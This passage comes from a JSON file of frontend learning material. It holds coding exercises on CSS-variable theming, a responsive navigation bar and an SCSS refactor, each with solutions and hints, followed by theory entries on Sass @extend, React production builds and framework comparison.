          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Dynamic Theming with CSS Variables</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <header>\n        <h1>My Themed Website</h1>\n        <button id=\"theme-toggle\">Toggle Theme</button>\n    </header>\n\n    <main>\n        <p>This is some content that will adapt to the theme.</p>\n        <button class=\"action-button\">Call to Action</button>\n    </main>\n\n    <footer>\n        <p>&copy; 2023 Themed Site</p>\n    </footer>\n\n    <script src=\"script.js\"></script>\n</body>\n</html>\n\n/* style.css */\nbody {\n    font-family: Arial, sans-serif;\n    transition: background-color 0.3s, color 0.3s;\n}\n\nheader {\n    padding: 20px;\n    margin-bottom: 20px;\n    border-bottom: 1px solid;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    transition: background-color 0.3s, color 0.3s, border-color 0.3s;\n}\n\nmain {\n    padding: 20px;\n    max-width: 800px;\n    margin: 0 auto 20px;\n}\n\n.action-button, #theme-toggle {\n    padding: 10px 20px;\n    border: none;\n    border-radius: 5px;\n    cursor: pointer;\n    transition: background-color 0.3s, color 0.3s;\n}\n\nfooter {\n    padding: 20px;\n    text-align: center;\n    border-top: 1px solid;\n    transition: background-color 0.3s, color 0.3s, border-color 0.3s;\n}\n\n/* Add your CSS variable declarations and theme class here */\n\n/* script.js */\ndocument.getElementById('theme-toggle').addEventListener('click', () => {\n    // Implement theme toggling logic here\n});\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Dynamic Theming with CSS Variables</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <header>\n        <h1>My Themed Website</h1>\n        <button id=\"theme-toggle\">Toggle Theme</button>\n    </header>\n\n    <main>\n        <p>This is some content that will adapt to the theme.</p>\n        <button class=\"action-button\">Call to Action</button>\n    </main>\n\n    <footer>\n        <p>&copy; 2023 Themed Site</p>\n    </footer>\n\n    <script src=\"script.js\"></script>\n</body>\n</html>\n\n/* style.css */\n:root {\n    /* Light Theme Variables */\n    --bg-color: #ffffff;\n    --text-color: #333333;\n    --primary-button-bg: #007bff;\n    --primary-button-text: #ffffff;\n    --border-color: #cccccc;\n}\n\n:root.dark-theme {\n    /* Dark Theme Variable Overrides */\n    --bg-color: #222222;\n    --text-color: #f0f0f0;\n    --primary-button-bg: #66ccff;\n    --primary-button-text: #222222;\n    --border-color: #555555;\n}\n\nbody {\n    font-family: Arial, sans-serif;\n    background-color: var(--bg-color);\n    color: var(--text-color);\n    transition: background-color 0.3s, color 0.3s;\n}\n\nheader {\n    padding: 20px;\n    margin-bottom: 20px;\n    background-color: var(--bg-color);\n    color: var(--text-color);\n    border-bottom: 1px solid var(--border-color);\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n    transition: background-color 0.3s, color 0.3s, border-color 0.3s;\n}\n\nmain {\n    padding: 20px;\n    max-width: 800px;\n    margin: 0 auto 20px;\n}\n\n.action-button, #theme-toggle {\n    padding: 10px 20px;\n    border: none;\n    border-radius: 5px;\n    cursor: pointer;\n    background-color: var(--primary-button-bg);\n    color: var(--primary-button-text);\n    transition: background-color 0.3s, color 0.3s;\n}\n\n.action-button:hover, #theme-toggle:hover {\n    opacity: 0.9;\n}\n\nfooter {\n    padding: 20px;\n    text-align: center;\n    background-color: var(--bg-color);\n    color: var(--text-color);\n    border-top: 1px solid var(--border-color);\n    transition: background-color 0.3s, color 0.3s, border-color 0.3s;\n}\n\n/* script.js */\ndocument.getElementById('theme-toggle').addEventListener('click', () => {\n    document.documentElement.classList.toggle('dark-theme');\n    // Optional: Save preference to localStorage\n    if (document.documentElement.classList.contains('dark-theme')) {\n        localStorage.setItem('theme', 'dark');\n    } else {\n        localStorage.setItem('theme', 'light');\n    }\n});\n\n// Optional: Apply saved theme on load\nwindow.addEventListener('load', () => {\n    const savedTheme = localStorage.getItem('theme');\n    if (savedTheme === 'dark') {\n        document.documentElement.classList.add('dark-theme');\n    } else {\n        document.documentElement.classList.remove('dark-theme');\n    }\n});\n",
          "testCases": [
            "**Initial Load:** Verify the page loads with the default (light) theme.",
            "**Toggle to Dark:** Click the 'Toggle Theme' button and verify that all specified elements (body, header, buttons, footer) switch to their dark theme colors.",
            "**Toggle back to Light:** Click the button again and verify that elements revert to their light theme colors.",
            "**Persistent Theme (Optional):** If implementing `localStorage`, close and reopen the page. Verify that the last selected theme is applied.",
            "**Dynamic Changes:** Inspect elements in developer tools and observe how the computed values of the CSS variables change when the `dark-theme` class is toggled on `<html>`."
          ],
          "hints": [
            "Declare your base variables inside `:root`.",
            "Create a new CSS rule `html.dark-theme { ... }` to redefine the variables for the dark theme. Because of CSS cascade, these will override the `:root` values when `dark-theme` is present.",
            "Use `var(--variable-name)` throughout your CSS to apply the theme-controlled values.",
            "In JavaScript, you can use `document.documentElement.classList.toggle('your-class-name')` to switch the theme.",
            "Consider adding `transition` properties to color and background properties for a smoother theme change effect."
          ],
          "tags": [
            "CSS Variables",
            "Theming",
            "JavaScript",
            "DOM Manipulation",
            "Frontend",
            "Dynamic Styling"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "CSS_variables",
            "JavaScript_DOM_basics"
          ],
          "complexity": 7,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "CSS Cascade",
            "User Interface",
            "State Management"
          ]
        },
        {
          "id": "task_media_queries_1",
          "title": "Implement a Responsive Navigation Bar",
          "description": "\nCreate a responsive navigation bar that adapts to different screen sizes using a mobile-first approach and media queries.\n\n1.  **Mobile (default):** The navigation links should stack vertically, taking full width, and be hidden by default. A 'hamburger' icon (represented by a button) should toggle their visibility.\n2.  **Tablet/Desktop (min-width: 768px):** The navigation links should display horizontally, aligned to the right, and always be visible. The 'hamburger' icon should be hidden.\n3.  Ensure smooth transitions for visibility changes (e.g., fading or sliding) for the mobile menu.\n\nYour solution should showcase understanding of mobile-first, media queries, and basic JavaScript for interactivity.\n",
          "difficulty": "hard",
          "startingCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Responsive Nav Bar</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <nav class=\"navbar\">\n        <div class=\"nav-header\">\n            <a href=\"#\" class=\"brand-logo\">MySite</a>\n            <button class=\"nav-toggle\" aria-label=\"toggle navigation\">\n                <span class=\"hamburger-icon\"></span>\n            </button>\n        </div>\n        <ul class=\"nav-links\">\n            <li><a href=\"#home\">Home</a></li>\n            <li><a href=\"#about\">About</a></li>\n            <li><a href=\"#services\">Services</a></li>\n            <li><a href=\"#contact\">Contact</a></li>\n        </ul>\n    </nav>\n\n    <div style=\"height: 1000px; background-color: #f0f0f0; padding: 20px;\">Scrollable content to test fixed nav if applicable</div>\n\n    <script src=\"script.js\"></script>\n</body>\n</html>\n\n/* style.css */\nbody {\n    margin: 0;\n    font-family: Arial, sans-serif;\n}\n\n.navbar {\n    background-color: #333;\n    color: white;\n    padding: 10px 20px;\n    display: flex;\n    flex-direction: column; /* Mobile: stack header and links */\n    align-items: flex-start;\n}\n\n.nav-header {\n    width: 100%;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.brand-logo {\n    color: white;\n    text-decoration: none;\n    font-size: 1.5em;\n    font-weight: bold;\n}\n\n.nav-toggle {\n    background: none;\n    border: none;\n    color: white;\n    font-size: 1.5em;\n    cursor: pointer;\n    padding: 5px;\n}\n\n.hamburger-icon {\n    display: block; /* Hamburger lines placeholder */\n    width: 25px;\n    height: 3px;\n    background-color: white;\n    position: relative;\n}\n\n.hamburger-icon::before, .hamburger-icon::after {\n    content: '';\n    display: block;\n    width: 25px;\n    height: 3px;\n    background-color: white;\n    position: absolute;\n    left: 0;\n}\n\n.hamburger-icon::before {\n    top: -8px;\n}\n\n.hamburger-icon::after {\n    top: 8px;\n}\n\n.nav-links {\n    list-style: none;\n    margin: 0;\n    padding: 0;\n    width: 100%;\n    /* Mobile: hidden by default */\n    max-height: 0; /* for animation */\n    overflow: hidden;\n    transition: max-height 0.3s ease-out;\n}\n\n.nav-links.open {\n    max-height: 200px; /* Adjust as needed for content */\n}\n\n.nav-links li {\n    text-align: center;\n    padding: 10px 0;\n    border-top: 1px solid #555;\n}\n\n.nav-links li:first-child {\n    border-top: none;\n}\n\n.nav-links a {\n    color: white;\n    text-decoration: none;\n    display: block;\n    padding: 5px;\n}\n\n/* Desktop styles via media query go here */\n\n/* script.js */\ndocument.querySelector('.nav-toggle').addEventListener('click', () => {\n    const navLinks = document.querySelector('.nav-links');\n    // Implement toggle functionality\n});\n",
          "solutionCode": "<!-- index.html -->\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n    <meta charset=\"UTF-8\">\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n    <title>Responsive Nav Bar</title>\n    <link rel=\"stylesheet\" href=\"style.css\">\n</head>\n<body>\n    <nav class=\"navbar\">\n        <div class=\"nav-header\">\n            <a href=\"#\" class=\"brand-logo\">MySite</a>\n            <button class=\"nav-toggle\" aria-label=\"toggle navigation\">\n                <span class=\"hamburger-icon\"></span>\n            </button>\n        </div>\n        <ul class=\"nav-links\">\n            <li><a href=\"#home\">Home</a></li>\n            <li><a href=\"#about\">About</a></li>\n            <li><a href=\"#services\">Services</a></li>\n            <li><a href=\"#contact\">Contact</a></li>\n        </ul>\n    </nav>\n\n    <div style=\"height: 1000px; background-color: #f0f0f0; padding: 20px;\">Scrollable content to test fixed nav if applicable</div>\n\n    <script src=\"script.js\"></script>\n</body>\n</html>\n\n/* style.css */\nbody {\n    margin: 0;\n    font-family: Arial, sans-serif;\n}\n\n.navbar {\n    background-color: #333;\n    color: white;\n    padding: 10px 20px;\n    display: flex;\n    flex-direction: column; /* Mobile: stack header and links */\n    align-items: flex-start;\n    box-shadow: 0 2px 5px rgba(0,0,0,0.2);\n}\n\n.nav-header {\n    width: 100%;\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n}\n\n.brand-logo {\n    color: white;\n    text-decoration: none;\n    font-size: 1.5em;\n    font-weight: bold;\n}\n\n.nav-toggle {\n    background: none;\n    border: none;\n    color: white;\n    font-size: 1.5em;\n    cursor: pointer;\n    padding: 5px;\n}\n\n/* Hamburger icon styling */\n.hamburger-icon {\n    display: block;\n    width: 25px;\n    height: 3px;\n    background-color: white;\n    position: relative;\n    transition: background-color 0.3s ease-in-out;\n}\n\n.hamburger-icon::before, .hamburger-icon::after {\n    content: '';\n    display: block;\n    width: 25px;\n    height: 3px;\n    background-color: white;\n    position: absolute;\n    left: 0;\n    transition: transform 0.3s ease-in-out, top 0.3s ease-in-out;\n}\n\n.hamburger-icon::before {\n    top: -8px;\n}\n\n.hamburger-icon::after {\n    top: 8px;\n}\n\n/* Animation for 'X' when menu is open */\n.nav-toggle.open .hamburger-icon {\n    background-color: transparent;\n}\n\n.nav-toggle.open .hamburger-icon::before {\n    transform: translateY(8px) rotate(45deg);\n}\n\n.nav-toggle.open .hamburger-icon::after {\n    transform: translateY(-8px) rotate(-45deg);\n}\n\n.nav-links {\n    list-style: none;\n    margin: 0;\n    padding: 0;\n    width: 100%;\n    /* Mobile: hidden by default */\n    max-height: 0; /* for animation */\n    overflow: hidden;\n    transition: max-height 0.3s ease-out;\n}\n\n.nav-links.open {\n    max-height: 200px; /* Adjust based on content height */\n}\n\n.nav-links li {\n    text-align: center;\n    padding: 10px 0;\n    border-top: 1px solid #555;\n}\n\n.nav-links li:first-child {\n    border-top: none;\n}\n\n.nav-links a {\n    color: white;\n    text-decoration: none;\n    display: block;\n    padding: 5px;\n}\n\n.nav-links a:hover {\n    color: #007bff;\n}\n\n/* Tablet/Desktop layout */\n@media (min-width: 768px) {\n    .navbar {\n        flex-direction: row; /* Desktop: items in a row */\n        justify-content: space-between; /* Space out logo and links */\n        align-items: center;\n    }\n\n    .nav-toggle {\n        display: none; /* Hide hamburger on larger screens */\n    }\n\n    .nav-links {\n        max-height: none; /* Always visible */\n        overflow: visible;\n        display: flex; /* Display links horizontally */\n        width: auto;\n    }\n\n    .nav-links li {\n        border-top: none;\n        padding: 0 10px;\n    }\n\n    .nav-links li:last-child {\n      padding-right: 0;\n    }\n\n    .nav-links a {\n        padding: 0;\n    }\n}\n\n/* script.js */\ndocument.querySelector('.nav-toggle').addEventListener('click', () => {\n    const navLinks = document.querySelector('.nav-links');\n    const navToggle = document.querySelector('.nav-toggle');\n    navLinks.classList.toggle('open');\n    navToggle.classList.toggle('open'); // For hamburger animation\n});\n",
          "testCases": [
            "**Mobile View (e.g., < 768px):** Verify the hamburger icon is visible and clickable. Ensure the navigation links are hidden initially. Clicking the hamburger icon should toggle the visibility of the vertical navigation links with a smooth transition. Clicking again should hide them.",
            "**Tablet/Desktop View (e.g., >= 768px):** Verify the hamburger icon is hidden. Ensure the navigation links are always visible, arranged horizontally, and aligned to the right. Resizing from mobile to desktop should seamlessly transition the navigation appearance.",
            "**Responsiveness on Resize:** Start in mobile view, open the menu, then resize to desktop. The menu should automatically become horizontal and the hamburger hidden. Resize back to mobile; the menu should revert to its hidden, togglable state.",
            "**Accessibility:** Check if the toggle button has appropriate ARIA attributes (e.g., `aria-expanded`) and a label. (Self-correction: The starting code includes `aria-label`, so ensure it's still good).",
            "**Link Functionality:** Ensure clicking on navigation links works (e.g., scrolls to section, even if no actual sections are defined yet)."
          ],
          "hints": [
            "Use `display: none;` or `visibility: hidden;` for the mobile menu elements that should be hidden by default. For animation, `max-height: 0; overflow: hidden;` is often better than `display: none;` as it allows for CSS transitions.",
            "The JavaScript should toggle a class (e.g., `open`) on the `ul.nav-links` to control its visibility/max-height.",
            "Inside the `min-width: 768px` media query, override the mobile-specific styles: set the navigation links to `display: flex;` for horizontal layout and ensure `max-height` is `none` or a sufficiently large value so they are always visible. Hide the hamburger toggle.",
            "For the hamburger icon transition to an 'X', you can use CSS transforms on its `::before` and `::after` pseudo-elements when the `open` class is applied to the toggle button itself."
          ],
          "tags": [
            "CSS",
            "Responsive Design",
            "Media Queries",
            "JavaScript",
            "Navigation",
            "Mobile-First",
            "Flexbox"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "Media_queries",
            "Flexbox_basics",
            "JavaScript_DOM_basics"
          ],
          "complexity": 9,
          "interviewRelevance": 10,
          "learningPath": "advanced",
          "relatedConcepts": [
            "Hamburger Menu",
            "Accessibility",
            "UX Design"
          ]
        },
        {
          "id": "task_sass_1",
          "title": "Refactor CSS to SCSS with Variables, Nesting, and Mixins",
          "description": "\nRefactor the provided plain CSS snippet into well-structured SCSS code, demonstrating the use of Sass variables, nesting, and mixins.\n\n**Original CSS:**\n```css\n.container {\n  background-color: #f0f0f0;\n  padding: 20px;\n  border: 1px solid #ccc;\n  font-family: 'Open Sans', sans-serif;\n  color: #333;\n}\n\n.container .card {\n  background-color: #ffffff;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);\n  margin-bottom: 15px;\n  padding: 15px;\n}\n\n.container .card h2 {\n  font-size: 1.5em;\n  color: #007bff;\n  margin-top: 0;\n}\n\n.container .card p {\n  line-height: 1.6;\n}\n\n.container .card .button {\n  display: inline-block;\n  background-color: #007bff;\n  color: #ffffff;\n  padding: 10px 15px;\n  border: none;\n  border-radius: 5px;\n  cursor: pointer;\n  transition: background-color 0.3s ease;\n}\n\n.container .card .button:hover {\n  background-color: #0056b3;\n}\n\n.container .card.featured .button {\n  background-color: #28a745;\n}\n\n.container .card.featured .button:hover {\n  background-color: #218838;\n}\n```\n\n**Your Task:**\n1.  **Variables:** Identify common values (colors, spacing, border-radius, font stack) and define them as Sass variables.\n2.  **Nesting:** Restructure the selectors using proper SCSS nesting to reflect the HTML hierarchy.\n3.  **Mixins:** Create a mixin for the common button styles, allowing for configurable background and text colors (and potentially hover colors if desired). Use this mixin for both `.button` and `.featured .button`.\n4.  Ensure the compiled CSS from your SCSS is functionally identical to the original CSS.\n",
          "difficulty": "medium",
          "startingCode": "/* Start with this plain CSS and refactor it into SCSS */\n/* style.css (to be refactored to style.scss) */\n.container {\n  background-color: #f0f0f0;\n  padding: 20px;\n  border: 1px solid #ccc;\n  font-family: 'Open Sans', sans-serif;\n  color: #333;\n}\n\n.container .card {\n  background-color: #ffffff;\n  border: 1px solid #ddd;\n  border-radius: 8px;\n  box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);\n  margin-bottom: 15px;\n  padding: 15px;\n}\n\n.container .card h2 {\n  font-size: 1.5em;\n  color: #007bff;\n  margin-top: 0;\n}\n\n.container .card p {\n  line-height: 1.6;\n}\n\n.container .card .button {\n  display: inline-block;\n  background-color: #007bff;\n  color: #ffffff;\n  padding: 10px 15px;\n  border: none;\n  border-radius: 5px;\n  cursor: pointer;\n  transition: background-color 0.3s ease;\n}\n\n.container .card .button:hover {\n  background-color: #0056b3;\n}\n\n.container .card.featured .button {\n  background-color: #28a745;\n}\n\n.container .card.featured .button:hover {\n  background-color: #218838;\n}\n",
          "solutionCode": "// style.scss\n\n// 1. Variables\n$base-bg: #f0f0f0;\n$text-color: #333;\n$border-light: #ccc;\n$border-darker: #ddd;\n$card-bg: #ffffff;\n$shadow-color: rgba(0, 0, 0, 0.1);\n$primary-color: #007bff;\n$primary-color-dark: #0056b3; // Darker shade for hover\n$success-color: #28a745;\n$success-color-dark: #218838; // Darker shade for hover\n$button-text-color: #ffffff;\n$spacing-sm: 10px;\n$spacing-md: 15px;\n$spacing-lg: 20px;\n$radius-sm: 5px;\n$radius-md: 8px;\n$font-stack: 'Open Sans', sans-serif;\n\n// 3. Mixins\n@mixin button-styles($bg-color, $hover-bg-color, $text-color) {\n  display: inline-block;\n  background-color: $bg-color;\n  color: $text-color;\n  padding: $spacing-sm $spacing-md;\n  border: none;\n  border-radius: $radius-sm;\n  cursor: pointer;\n  transition: background-color 0.3s ease;\n\n  &:hover {\n    background-color: $hover-bg-color;\n  }\n}\n\n// 2. Nesting\n.container {\n  background-color: $base-bg;\n  padding: $spacing-lg;\n  border: 1px solid $border-light;\n  font-family: $font-stack;\n  color: $text-color;\n\n  .card {\n    background-color: $card-bg;\n    border: 1px solid $border-darker;\n    border-radius: $radius-md;\n    box-shadow: 0 4px 8px $shadow-color;\n    margin-bottom: $spacing-md;\n    padding: $spacing-md;\n\n    h2 {\n      font-size: 1.5em;\n      color: $primary-color;\n      margin-top: 0;\n    }\n\n    p {\n      line-height: 1.6;\n    }\n\n    .button {\n      @include button-styles($primary-color, $primary-color-dark, $button-text-color);\n    }\n\n    &.featured {\n      .button {\n        @include button-styles($success-color, $success-color-dark, $button-text-color);\n      }\n    }\n  }\n}\n",
          "testCases": [
            "**Compilation Check:** Compile the SCSS to CSS. The resulting CSS file should be functionally identical to the original provided CSS.",
            "**Variable Usage:** Verify that all common values are replaced by Sass variables in the compiled output.",
            "**Nesting Structure:** Check that the selectors in the compiled CSS reflect the flattened structure of nested selectors (e.g., `.container .card h2`).",
            "**Mixin Expansion:** Confirm that the `button-styles` mixin correctly expands its properties into the `.button` and `.featured .button` selectors, including the dynamic background colors based on arguments.",
            "**Browser Rendering:** Apply the original CSS to an HTML page, then replace it with the compiled SCSS. Visually confirm that there is no change in the rendered output, ensuring the refactoring maintained fidelity."
          ],
          "hints": [
            "Start by creating a few core variables for colors (e.g., `$primary-color`, `$text-color`) and common spacing values (e.g., `$base-padding`, `$gap`).",
            "For nesting, simply indent the child selectors within their parent. Remember that `&` refers to the parent selector, useful for pseudo-classes like `&:hover` or combining classes like `&.featured`.",
            "Define your mixin using `@mixin my-mixin-name($arg1, $arg2) { ... }`. For the button, you'll want arguments for the background color, hover background color, and text color.",
            "Include the mixin using `@include my-mixin-name(value1, value2);`."
          ],
          "tags": [
            "Sass",
            "SCSS",
            "Refactoring",
            "Variables",
            "Nesting",
            "Mixins",
            "CSS Architecture"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "Sass_basics",
            "CSS_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "CSS Maintainability",
            "Design Systems",
            "Code Organization"
          ]
        }
      ]
    }
  },
  {
    "id": "1111efac-9fec-4735-81b0-1e73c145a4fd",
    "startLine": 12100,
    "endLine": 12199,
    "processedDate": "2025-06-17T12:46:25.221Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_sass_extend_inheritance",
          "title": "SASS Extend and Inheritance",
          "content": "SASS's `@extend` directive allows a selector to inherit the styles of another selector, promoting code reuse and maintaining the DRY (Don't Repeat Yourself) principle. This is particularly useful for creating variations of components that share a common base style.\n\n## Key Concepts\n\n-   **`@extend` Directive**: Used to share a set of CSS properties from one selector to another. When `@extend` is used, SASS generates a combined selector in the compiled CSS, ensuring that the extending selector (e.g., `.primary-button`) shares the rules of the extended selector (e.g., `%button-base`).\n\n-   **Placeholder Selectors (`%`)**: These are special types of selectors in SASS that will not output any CSS on their own. They are designed exclusively to be `@extend`ed by other selectors. This prevents unnecessary CSS output for base styles that are only intended for inheritance.\n\n-   **Benefits**: \n    -   **DRY Code**: Reduces repetition by allowing shared styles to be defined once.\n    -   **Semantic Markup**: You can use meaningful class names in your HTML (e.g., `.primary-button`) while abstracting common styles into SASS extendable definitions.\n    -   **Maintainability**: Changes to the base style propagate automatically to all extending selectors.\n\n-   **Potential Drawbacks**: \n    -   **Output Bloat**: Overuse or improper use of `@extend` can sometimes lead to very long, comma-separated selectors in the compiled CSS, increasing file size and potentially making the CSS harder to read.\n    -   **Specificity Issues**: If not carefully managed, extending selectors with different specificities can lead to unexpected cascade behavior.\n    -   **Source Order Issues**: The order of `@extend` directives can sometimes affect the compiled output if rules are overridden.\n\nWhen `primary-button` extends `button-base`, SASS includes the styles from `button-base` directly into the `primary-button`'s ruleset in the compiled CSS, usually by grouping selectors.",
          "examples": [
            {
              "id": "example_sass_extend_1",
              "title": "Basic SASS Extend with Placeholder",
              "code": "```scss\n// Define a base button style using a placeholder selector\n%button-base {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-family: sans-serif;\n  border-radius: 4px;\n}\n\n// Extend the base style for a primary button\n.primary-button {\n  @extend %button-base;\n  background-color: #007bff;\n  color: white;\n}\n\n// Extend the base style for a secondary button\n.secondary-button {\n  @extend %button-base;\n  background-color: #6c757d;\n  color: white;\n}\n```\n\n**Compiled CSS Output:**\n\n```css\n.primary-button, .secondary-button {\n  padding: 10px 20px;\n  border: none;\n  cursor: pointer;\n  font-family: sans-serif;\n  border-radius: 4px;\n}\n\n.primary-button {\n  background-color: #007bff;\n  color: white;\n}\n\n.secondary-button {\n  background-color: #6c757d;\n  color: white;\n}\n```",
              "explanation": "This example demonstrates how `%button-base` defines a set of common styles. Both `.primary-button` and `.secondary-button` use `@extend %button-base` to inherit these styles. In the compiled CSS, SASS groups the selectors that extend the same placeholder, reducing redundant code. This approach ensures that changes to `%button-base` automatically apply to all buttons extending it, promoting consistency and easier maintenance.",
              "language": "scss"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "SASS",
            "CSS Preprocessors",
            "Extend",
            "Inheritance",
            "Styling",
            "DRY"
          ],
          "technology": "SASS",
          "prerequisites": [
            "CSS Fundamentals",
            "Basic SASS Syntax"
          ],
          "complexity": 5,
          "interviewRelevance": 7,
          "learningPath": "intermediate",
          "requiredFor": [
            "Maintainable CSS",
            "Scalable Styling Architectures"
          ]
        },
        {
          "id": "theory_react_production_deployment",
          "title": "Optimizing React for Production Deployment",
          "content": "Deploying a React application to production involves several key optimizations to ensure the best performance, smallest bundle size, and removal of development-specific overhead. A crucial step is setting the application to 'production mode'.\n\n## Setting Production Mode\n\nReact's production mode is a build-time optimization that:\n\n1.  **Removes Development Warnings**: All `console.warn` statements and other development-specific checks (e.g., prop type warnings, key warnings) are stripped out, reducing JavaScript bundle size and improving runtime performance.\n2.  **Enables Optimizations**: React's internal mechanisms (like Virtual DOM diffing) can take shortcuts and perform more aggressively when they know they don't need to account for development utilities.\n\nThis mode is primarily controlled via the `process.env.NODE_ENV` environment variable. When `process.env.NODE_ENV` is set to `'production'`, bundlers like Webpack or Rollup, along with React itself, perform these optimizations.\n\n### Using Webpack's DefinePlugin\n\nFor projects using Webpack, the `DefinePlugin` is commonly used to inject global variables at compile time. By defining `process.env.NODE_ENV` as a string literal `'production'`, Webpack can then leverage dead code elimination (tree-shaking) to remove the development-only code paths.\n\nWhen you use `create-react-app` (CRA) or similar modern build tools, these optimizations are typically handled automatically. Running `npm run build` or `yarn build` with CRA will by default compile your application in production mode, without requiring manual Webpack configuration for `DefinePlugin`.\n\nSimilarly, tools like Vite, Next.js, and Gatsby also handle production builds automatically, abstracting away the underlying Webpack or Rollup configurations for `process.env.NODE_ENV`.\n\n## Other Production Optimizations\n\nBeyond setting production mode, other vital optimizations include:\n\n-   **Code Splitting**: Breaking down the large JavaScript bundle into smaller chunks that can be loaded on demand.\n-   **Minification & Uglification**: Reducing file size by removing whitespace, comments, and shortening variable names.\n-   **Tree Shaking**: Eliminating unused code (dead code) from the final bundle.\n-   **Lazy Loading**: Loading components or routes only when they are needed.\n-   **Image Optimization**: Compressing and optimizing image assets.\n-   **Caching**: Leveraging browser and server-side caching mechanisms.\n-   **CDN Usage**: Delivering static assets via Content Delivery Networks for faster global access.",
          "examples": [
            {
              "id": "example_react_production_webpack",
              "title": "Webpack Configuration for Production Mode",
              "code": "```javascript\nconst webpack = require('webpack');\n\nmodule.exports = {\n  mode: 'production', // Setting mode to 'production' in Webpack 4+ automatically applies DefinePlugin and other optimizations\n  entry: './src/index.js',\n  output: {\n    filename: 'bundle.js',\n    path: __dirname + '/dist'\n  },\n  plugins: [\n    new webpack.DefinePlugin({\n      'process.env.NODE_ENV': JSON.stringify('production')\n    })\n    // Other plugins like HtmlWebpackPlugin, MiniCssExtractPlugin etc.\n  ],\n  // ... other config (loaders, resolve, etc.)\n};\n```",
              "explanation": "This Webpack configuration snippet explicitly sets `process.env.NODE_ENV` to `'production'` using `webpack.DefinePlugin`. This ensures that any code paths dependent on this environment variable (like React's development warnings) are removed during the build process. For Webpack 4+, simply setting `mode: 'production'` handles many of these optimizations automatically, including the `DefinePlugin` setup internally.",
              "language": "javascript"
            },
            {
              "id": "example_react_conditional_code",
              "title": "React Code with Environment Variable Check",
              "code": "```javascript\nimport React from 'react';\n\nfunction MyComponent() {\n  if (process.env.NODE_ENV !== 'production') {\n    console.warn('This is a development-only warning for MyComponent!');\n  }\n\n  return (\n    <div>\n      <p>Hello from MyComponent</p>\n    </div>\n  );\n}\n\nexport default MyComponent;\n```",
              "explanation": "This React component demonstrates how `process.env.NODE_ENV` is used within application code. In development mode, the warning will be logged. When bundled for production with `process.env.NODE_ENV` set to `'production'`, the `if` block will be evaluated to `if (false)` and typically removed by bundlers via dead code elimination, preventing the warning from appearing in the final production bundle.",
              "language": "javascript"
            }
          ],
          "relatedQuestions": [],
          "relatedTasks": [],
          "tags": [
            "React",
            "Production",
            "Optimization",
            "Webpack",
            "Performance",
            "Deployment",
            "Environment Variables"
          ],
          "technology": "React",
          "prerequisites": [
            "Basic React Development",
            "Module Bundlers (Webpack concepts)"
          ],
          "complexity": 6,
          "interviewRelevance": 8,
          "learningPath": "intermediate",
          "requiredFor": [
            "Professional React Development",
            "Web Performance Optimization"
          ]
        },
        {
          "id": "theory_javascript_framework_comparison",
          "title": "JavaScript Framework Comparison: React vs Angular vs Vue.js",
          "content": "Choosing the right JavaScript framework is a critical decision for any frontend project. React, Angular, and Vue.js are the three most popular choices, each with distinct philosophies, strengths, and ideal use cases. Understanding their core differences helps in making an informed decision tailored to project needs, team expertise, and scalability goals.\n\n## Core Feature Comparison\n\n| Feature            | React                                     | Angular                                   | Vue.js                                   |\n| :----------------- | :---------------------------------------- | :---------------------------------------- | :--------------------------------------- |\n| **Type**           | Library                                   | Full Framework                            | Progressive Framework                    |\n| **Learning Curve** | Moderate                                  | Steep                                     | Gentle                                   |\n| **Data Binding**   | One-way                                   | Two-way                                   | Two-way (Optional)                       |\n| **DOM**            | Virtual DOM                               | Real DOM with incremental DOM             | Virtual DOM                              |\n| **Architecture**   | Component-based                           | Component-based with MVC                  | Component-based                          |\n| **Language**       | JavaScript/JSX                            | TypeScript                                | JavaScript/HTML                          |\n| **Mobile Solutions**| React Native                             | Ionic, NativeScript                       | Vue Native, Quasar                       |\n| **Size**           | ~40KB                                     | ~143KB                                    | ~33KB                                    |\n| **Performance**    | High                                      | High                                      | High                                     |\n| **Flexibility**    | Very flexible                             | Less flexible, more opinionated           | Very flexible                            |\n| **Community/Ecosystem**| Very large                                | Large                                     | Growing rapidly                          |\n\n## Detailed Feature Overview\n\n-   **Type**: React is a UI library, providing tools for building user interfaces. Angular is a comprehensive, opinionated framework providing a full suite of features (routing, state management, HTTP client, etc.). Vue.js is a progressive framework, meaning it can be adopted incrementally and scaled from a small library to a full-fledged framework.\n-   **Learning Curve**: React has a moderate learning curve, especially with JSX and its ecosystem. Angular is considered steep due to its strong conventions, TypeScript requirement, and reliance on concepts like Dependency Injection and RxJS. Vue.js is widely praised for its gentle learning curve, making it approachable for developers from various backgrounds.\n-   **Data Binding**: React uses one-way data binding (unidirectional data flow), making state changes predictable. Angular features two-way data binding, where changes in the UI 